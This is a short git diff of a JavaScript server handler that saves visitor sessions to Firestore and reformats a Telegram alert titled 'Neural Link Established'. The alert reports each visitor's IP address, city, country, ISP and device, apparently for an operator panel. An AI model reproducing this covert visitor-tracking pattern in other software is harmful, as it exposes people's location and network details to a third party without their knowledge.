@@ -59,13 +59,16 @@ module.exports = async (req, res) => {
         // 3. Initialize/Update Firestore Document
         await db.collection('visitors_v1').doc(sessionID).set(sessionData, { merge: true });
 
-        // 4. Send Telegram Notification (Neural Link Established - Per Final Guide)
-        const telegramMsg = `🎯 <b>Neural Link Established</b>\n\n` +
-            `🆔 <b>ID:</b> <code>${sessionID}</code>\n` +
-            `🌍 <b>Loc:</b> ${sessionData.city}, ${sessionData.country}\n` +
+        // 4. Send Telegram Notification (Neural Link Established - Standardized Format)
+        const separator = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        const telegramMsg = `🎯 <b>Neural Link Established</b>\n` +
+            `${separator}\n` +
+            `🆔 <b>SESSION:</b> <code>${sessionID}</code>\n` +
+            `🌍 <b>LOCATION:</b> ${sessionData.city}, ${sessionData.country}\n` +
             `📡 <b>IP:</b> <code>${sessionData.ip}</code>\n` +
             `🏢 <b>ISP:</b> ${sessionData.org}\n` +
-            `💻 <b>Sys:</b> ${(sessionData.device && sessionData.device.model) ? sessionData.device.model : (sessionData.device || 'Unknown')} (${(sessionData.device && sessionData.device.os) ? sessionData.device.os : 'N/A'})`;
+            `💻 <b>DEVICE:</b> ${(sessionData.device && sessionData.device.model) ? sessionData.device.model : (sessionData.device || 'Unknown')} (${(sessionData.device && sessionData.device.os) ? sessionData.device.os : 'N/A'})\n` +
+            `${separator}`;
 
         const buttons = {
             inline_keyboard: [
